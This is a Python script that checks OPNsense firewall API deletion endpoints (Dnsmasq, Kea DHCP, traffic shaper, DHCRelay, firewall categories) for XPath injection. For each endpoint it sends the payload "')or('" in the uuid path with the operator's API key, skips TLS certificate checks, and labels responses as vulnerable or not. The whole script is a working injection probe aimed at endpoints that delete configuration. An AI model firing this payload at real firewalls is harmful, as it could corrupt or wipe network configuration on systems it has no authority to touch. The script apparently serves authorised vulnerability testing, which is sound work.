#!/usr/bin/env python3
import argparse
import base64
import json
import ssl
import sys
import urllib.error
import urllib.request

PAYLOAD = "')or('"

ENDPOINTS = [
    # TrafficShaper - privilege: Firewall: Shaper
    "/api/trafficshaper/settings/del_pipe/",
    "/api/trafficshaper/settings/del_queue/",
    "/api/trafficshaper/settings/del_rule/",
    # DHCRelay - privilege: Services: DHCRelay
    "/api/dhcrelay/settings/del_relay/",
    "/api/dhcrelay/settings/del_dest/",
    # Dnsmasq - privilege: Services: Dnsmasq DNS/DHCP: Settings
    "/api/dnsmasq/settings/del_host/",
    "/api/dnsmasq/settings/del_domain/",
    "/api/dnsmasq/settings/del_tag/",
    "/api/dnsmasq/settings/del_range/",
    "/api/dnsmasq/settings/del_option/",
    "/api/dnsmasq/settings/del_boot/",
    # Firewall Category - privilege: Firewall: Categories
    "/api/firewall/category/del_item/",
    # Kea DHCPv4 - privilege: Services: DHCP: Kea(v4)
    "/api/kea/dhcpv4/del_subnet/",
    "/api/kea/dhcpv4/del_reservation/",
    "/api/kea/dhcpv4/del_option/",
    "/api/kea/dhcpv4/del_peer/",
    # Kea DHCPv6 - privilege: Services: DHCP: Kea(v6)i
    "/api/kea/dhcpv6/del_subnet/",
    "/api/kea/dhcpv6/del_reservation/",
    "/api/kea/dhcpv6/del_option/",
    "/api/kea/dhcpv6/del_pd_pool/",
    "/api/kea/dhcpv6/del_peer/",
]

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE


def _auth_header(key: str, secret: str) -> str:
    return "Basic " + base64.b64encode(f"{key}:{secret}".encode()).decode()


def probe(base_url: str, endpoint: str, key: str, secret: str) -> tuple[int, dict | None]:
    url = base_url.rstrip("/") + endpoint + PAYLOAD
    req = urllib.request.Request(url, data=b"", method="POST")
    req.add_header("Authorization", _auth_header(key, secret))
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx, timeout=10) as r:
            return r.status, _json(r.read())
    except urllib.error.HTTPError as e:
        return e.code, _json(e.read())
    except urllib.error.URLError as e:
        print(f"  {RED}connection error:{RESET} {e.reason}", file=sys.stderr)
        return -1, None


def _json(raw: bytes) -> dict | None:
    try:
        return json.loads(raw.decode())
    except Exception:
        return None


def classify(status: int, body: dict | None) -> tuple[str, str]:
    if status == 500 and isinstance(body, dict) and "errorMessage" in body:
        return "VULNERABLE", RED
    if status == 200 and isinstance(body, dict):
        result = body.get("result", "")
        if result == "not found":
            return "INCONCLUSIVE", YELLOW
        if result == "failed":
            return "OK", GREEN
    if status == 404:
        return "NOT FOUND", RESET
    if status in (401, 403):
        return "AUTH ERROR", YELLOW
    if status == -1:
        return "UNREACHABLE", RESET
    return f"UNKNOWN ({status})", RESET


def scan_all(base_url: str, key: str, secret: str) -> None:
    print(f"\n{BOLD}OPNsense XPath injection scan{RESET}  {base_url}")
    print(f"Payload : {PAYLOAD}\n")
    col_w = max(len(ep) for ep in ENDPOINTS) + 2
    print(f"{'Endpoint':<{col_w}} {'HTTP':>4}  Result")
    print("-" * (col_w + 20))
    for ep in ENDPOINTS:
        status, body = probe(base_url, ep, key, secret)
        label, colour = classify(status, body)
        http_str = str(status) if status != -1 else "  -"
        print(f"{ep:<{col_w}} {http_str:>4}  {colour}{BOLD}{label}{RESET}")


def scan_one(base_url: str, endpoint: str, key: str, secret: str) -> None:
    url = base_url.rstrip("/") + endpoint + PAYLOAD
    status, body = probe(base_url, endpoint, key, secret)
    label, colour = classify(status, body)
    print(f"\nURL     : {url}")
    print(f"HTTP    : {status}")
    print(f"Result  : {colour}{BOLD}{label}{RESET}")
    print(f"\n--- response ---")
    if body is not None:
        print(json.dumps(body, indent=2, ensure_ascii=False))
    else:
        print("(no parseable JSON body)")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Check OPNsense del* Action endpoints for XPath injection via uuid path parameter"
    )
    parser.add_argument("--apikey",    required=True,  help="OPNsense API key")
    parser.add_argument("--apisecret", required=True,  help="OPNsense API secret")
    parser.add_argument("--baseurl",   default="https://192.168.1.1", help="Firewall base URL (default: https://192.168.1.1)")
    parser.add_argument("--endpoint",  metavar="PATH", help="Test a single endpoint path and print the full JSON response (e.g. /api/dnsmasq/settings/del_host/)")
    args = parser.parse_args()

    if args.endpoint:
        scan_one(args.baseurl, args.endpoint, args.apikey, args.apisecret)
    else:
        scan_all(args.baseurl, args.apikey, args.apisecret)


if __name__ == "__main__":
    main()
